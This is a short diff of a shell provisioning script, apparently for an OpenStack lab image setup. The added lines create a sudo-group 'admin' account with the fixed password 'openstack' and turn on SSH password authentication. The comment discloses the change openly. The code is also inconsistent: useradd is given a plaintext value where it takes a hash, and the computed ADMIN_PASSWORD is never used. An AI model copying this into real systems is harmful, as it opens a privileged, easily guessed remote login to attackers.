@@ -55,3 +55,10 @@ IMG_FILE=NetMon.img
 IMG_NAME=NetMon
 wget -q -O - http://$IMAGE_SERVER/Images/$IMG_FILE | \
 glance --os-image-api-version 2 image-create --protected True --name $IMG_NAME --visibility public --disk-format raw --container-format bare
+
+# enable password logins - password is hostname | openstack
+ADMIN_PASSWORD=`hostname`openstack
+useradd -g sudo -p openstack admin
+sed -i "/PasswordAuthentication no/c\PasswordAuthentication yes" /etc/ssh/sshd_config
+service ssh restart
+
